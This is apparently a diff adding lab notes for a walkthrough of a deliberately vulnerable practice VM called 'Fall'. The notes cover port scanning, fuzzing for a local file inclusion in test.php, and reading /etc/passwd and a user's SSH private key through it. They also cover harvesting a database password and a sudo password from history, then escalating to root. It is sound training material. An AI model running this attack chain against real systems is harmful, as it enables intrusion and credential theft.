@@ -1,0 +1,204 @@
+└─$ nmap -sSCV -p 80,111,139,443,445,3306,8000,8080,9090,10080,10443 192.168.56.134
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 23:02 PDT
+Nmap scan report for 192.168.56.134
+Host is up (0.00044s latency).
+
+PORT      STATE  SERVICE     VERSION
+80/tcp    open   http        Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
+|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
+|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
+|_http-title: Good Tech Inc's Fall Sales - Home
+| http-robots.txt: 1 disallowed entry 
+|_/
+111/tcp   closed rpcbind
+139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+443/tcp   open   ssl/http    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
+|_http-title: Good Tech Inc's Fall Sales - Home
+|_ssl-date: TLS randomness does not represent time
+|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
+|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
+| tls-alpn: 
+|_  http/1.1
+| http-robots.txt: 1 disallowed entry 
+|_/
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2019-08-15T03:51:33
+|_Not valid after:  2020-08-19T05:31:33
+445/tcp   open   netbios-ssn Samba smbd 4.8.10 (workgroup: SAMBA)
+3306/tcp  open   mysql       MySQL (unauthorized)
+8000/tcp  closed http-alt
+8080/tcp  closed http-proxy
+9090/tcp  open   http        Cockpit web service 162 - 188
+|_http-title: Did not follow redirect to https://192.168.56.134:9090/
+10080/tcp closed amanda
+10443/tcp closed cirrossp
+MAC Address: 08:00:27:47:06:3A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 10h19m58s, deviation: 4h02m30s, median: 7h59m58s
+| smb2-time: 
+|   date: 2025-03-28T14:02:51
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.8.10)
+|   Computer name: fall
+|   NetBIOS computer name: FALL\x00
+|   Domain name: \x00
+|   FQDN: fall
+|_  System time: 2025-03-28T07:02:50-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+
+[23:17:08] 404 -   16B  - /php-cs-fixer.phar
+[23:17:08] 200 -   17B  - /phpinfo.php
+[23:17:09] 404 -   16B  - /phpunit.phar
+[23:17:10] 403 -  221B  - /ps_admin.cgi
+[23:17:11] 200 -   79B  - /robots.txt
+[23:17:12] 403 -  219B  - /signin.cgi
+[23:17:12] 403 -  218B  - /signin.pl
+[23:17:14] 200 -   80B  - /test.php
+[23:17:14] 403 -  217B  - /test.cgi
+[23:17:14] 301 -  234B  - /tmp  ->  http://192.168.56.134/tmp/
+[23:17:14] 200 -    1KB - /tmp/
+[23:17:14] 403 -  219B  - /tmp/cgi.pl
+[23:17:14] 403 -  224B  - /tmp/Cgishell.pl
+[23:17:14] 403 -  223B  - /tmp/domaine.pl
+[23:17:15] 301 -  238B  - /uploads  ->  http://192.168.56.134/uploads/
+[23:17:15] 200 -    0B  - /uploads/
+
+//if test.php is accessed, "Missing GET parameter!", we guess a LFI may happens 
+
+└─$ wfuzz  -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://fall/test.php?FUZZ=/etc/passwd --hw 7  
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://fall/test.php?FUZZ=/etc/passwd
+Total requests: 4734
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                            
+=====================================================================
+
+000001795:   200        32 L     67 W       1633 Ch     "file"     
+
+view-source:http://192.168.56.134/test.php?file=/etc/passwd
+    root:x:0:0:root:/root:/bin/bash
+    bin:x:1:1:bin:/bin:/sbin/nologin
+    daemon:x:2:2:daemon:/sbin:/sbin/nologin
+    adm:x:3:4:adm:/var/adm:/sbin/nologin
+    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+    sync:x:5:0:sync:/sbin:/bin/sync
+    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+    halt:x:7:0:halt:/sbin:/sbin/halt
+    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+    operator:x:11:0:operator:/root:/sbin/nologin
+    games:x:12:100:games:/usr/games:/sbin/nologin
+    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+    nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+    systemd-coredump:x:999:996:systemd Core Dumper:/:/sbin/nologin
+    systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+    systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+    dbus:x:81:81:System message bus:/:/sbin/nologin
+    polkitd:x:998:995:User for polkitd:/:/sbin/nologin
+    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+    cockpit-ws:x:997:993:User for cockpit-ws:/:/sbin/nologin
+    rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+    ntp:x:38:38::/etc/ntp:/sbin/nologin
+    abrt:x:173:173::/etc/abrt:/sbin/nologin
+    rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+    chrony:x:996:991::/var/lib/chrony:/sbin/nologin
+    tcpdump:x:72:72::/:/sbin/nologin
+    qiu:x:1000:1000:qiu:/home/qiu:/bin/bash
+    apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+    nginx:x:995:990:Nginx web server:/var/lib/nginx:/sbin/nologin
+    tss:x:59:59:Account used by the tpm2-abrmd package to sandbox the tpm2-abrmd daemon:/dev/null:/sbin/nologin
+    clevis:x:994:989:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
+    mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+
+//lets try .ssh/ files of qiu
+    view-source:http://192.168.56.134/test.php?file=/home/qiu/.ssh/id_rsa
+    //get the pricate key, and copy it to a local file id_rsa
+    └─$ chmod 600 id_rsa
+                                                                                                    
+    ┌──(ed㉿kali)-[~/oscptest]
+    └─$ ls -la
+    total 12
+    drwxrwxr-x  2 ed ed 4096 Mar 28 00:09 .
+    drwx------ 32 ed ed 4096 Mar 28 00:05 ..
+    -rw-------  1 ed ed 1831 Mar 28 00:09 id_rsa
+
+└─$ ssh qiu@192.168.56.134 -i id_rsa
+Web console: https://FALL:9090/
+
+[qiu@FALL ~]$ cat local.txt 
+A low privilege shell! :-)
+
+[qiu@FALL html]$ pwd
+/var/www/html
+[qiu@FALL html]$ cat config.php 
+<?php
+# CMS Made Simple Configuration File
+# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
+#
+$config['dbms'] = 'mysqli';
+$config['db_hostname'] = '127.0.0.1';
+$config['db_username'] = 'cms_user';
+$config['db_password'] = 'P@ssw0rdINSANITY';
+$config['db_name'] = 'cms_db';
+$config['db_prefix'] = 'cms_';
+$config['timezone'] = 'Asia/Singapore';
+$config['db_port'] = 3306;
+//found db user and passwd, whihc is not crackable.
+
+└─$ ssh qiu@192.168.56.134 -i id_rsa
+Web console: https://FALL:9090/
+
+Last login: Fri Mar 28 08:09:35 2025 from 192.168.56.105
+[qiu@FALL ~]$ history
+    1  ls -al
+    2  cat .bash_history 
+    3  rm .bash_history
+    4  echo "remarkablyawesomE" | sudo -S dnf update
+//seems we get qiu 's passwd
+[qiu@FALL ~]$ sudo -l
+[sudo] password for qiu: 
+Matching Defaults entries for qiu on FALL:
+    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User qiu may run the following commands on FALL:
+    (ALL) ALL
+//with ALL sudo privi, what left is easy.
+[qiu@FALL ~]$ sudo /bin/bash
+[root@FALL qiu]# cd /root
+[root@FALL ~]# ls -la
+total 40
+dr-xr-x---.  3 root root  206 Sep  5  2021 .
+dr-xr-xr-x. 17 root root  244 May 21  2021 ..
+-rw-------.  1 root root 3963 Aug 14  2019 anaconda-ks.cfg
+-rw-------   1 root root   57 Sep  5  2021 .bash_history
+-rw-r--r--.  1 root root   18 Feb  9  2018 .bash_logout
+-rw-r--r--.  1 root root  176 Feb  9  2018 .bash_profile
+-rw-r--r--.  1 root root  176 Feb  9  2018 .bashrc
+-rw-r--r--.  1 root root  100 Feb  9  2018 .cshrc
+-rw-------.  1 root root 3151 Aug 14  2019 original-ks.cfg
+----------   1 root root   30 May 21  2021 proof.txt
+-r--------   1 root root  452 Aug 30  2021 remarks.txt
+drwx------   2 root root   25 Sep  5  2021 .ssh
+-rw-r--r--.  1 root root  129 Feb  9  2018 .tcshrc
+[root@FALL ~]# cat proof.txt 
+Congrats on a root shell! :-)
